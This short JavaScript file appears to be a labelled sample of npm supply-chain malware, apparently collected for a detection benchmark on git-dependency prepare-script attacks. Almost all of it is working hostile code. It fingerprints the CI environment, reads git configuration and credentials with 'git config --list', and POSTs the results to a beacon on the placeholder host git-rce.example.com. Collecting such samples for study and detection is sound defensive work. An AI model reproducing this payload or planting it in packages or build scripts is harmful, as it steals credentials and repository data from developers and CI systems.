// Git dependency RCE: git:// dependency triggers prepare script with code execution
// Technique: git_dependency_rce — git URL dependencies bypass npm audit
// Real-world: 25 samples in Datadog benchmark

const { execSync } = require('child_process');
const os = require('os');
const http = require('http');

// Fingerprint the CI/CD environment
const info = {
  hostname: os.hostname(),
  platform: os.platform(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  ci: process.env.CI || 'false',
  github_repo: process.env.GITHUB_REPOSITORY || '',
  gitlab_project: process.env.CI_PROJECT_PATH || ''
};

// Attempt to read git credentials
try {
  info.git_credentials = execSync('git config --list', { encoding: 'utf8', timeout: 5000 });
} catch(e) {}

const data = JSON.stringify(info);
const req = http.request({
  hostname: 'git-rce.example.com',
  path: '/beacon',
  method: 'POST'
}, () => {});
req.write(data);
req.end();
